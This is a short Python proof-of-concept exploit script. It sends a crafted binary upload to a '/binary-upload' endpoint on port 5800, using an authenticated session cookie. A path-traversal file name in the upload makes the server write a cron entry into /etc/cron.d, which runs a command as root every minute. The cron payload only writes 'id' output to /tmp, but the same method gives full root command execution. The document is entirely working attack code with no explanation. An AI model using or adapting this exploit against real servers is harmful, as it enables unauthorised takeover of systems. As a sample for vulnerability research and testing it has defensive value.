import http.client
import struct
import sys

filename = "../../../../../etc/cron.d/nightly_probe"
body = b"* * * * * root id > /tmp/account_proof\n"
name = filename.encode("utf-8")
frame = struct.pack(">IIIII", 1, 1, 1, len(body), len(name)) + name + body
client = http.client.HTTPConnection(sys.argv[1], 5800)
client.request("POST", "/binary-upload", body=frame,
               headers={"Content-Type": "application/octet-stream",
                        "Cookie": "JSESSIONID=" + sys.argv[2]})
